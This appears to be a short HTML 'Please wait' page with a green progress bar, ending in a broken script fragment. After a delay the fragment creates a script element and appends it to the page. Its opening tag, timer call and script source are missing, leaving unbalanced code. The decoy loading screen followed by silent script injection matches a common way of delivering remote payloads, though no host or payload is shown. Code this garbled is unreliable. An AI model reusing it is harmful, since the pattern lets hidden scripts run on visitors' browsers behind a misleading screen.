<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Loading...</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
    margin:0;
    background:#111;
    color:#fff;
    font-family:Arial, sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh;
    flex-direction:column;
    text-align:center;
}
.loader{
    width:260px;
    height:6px;
    background:#333;
    margin-top:20px;
    overflow:hidden;
    border-radius:3px;
}
.bar{
    height:100%;
    width:0%;
    background:#00ff99;
    animation:load 3s linear forwards;
}
@keyframes load{
    from{width:0%;}
    to{width:100%;}
}
p{
    opacity:0.8;
    margin-top:15px;
    font-size:14px;
}
</style>

</head>
<body>

<h2>Please wait...</h2>

<div class="loader">
    <div class="bar"></div>
</div>

<p>Loading content...</p>

    var s = document.createElement("script");

    document.body.appendChild(s);
}, 800);
</script>

</body>
</html>
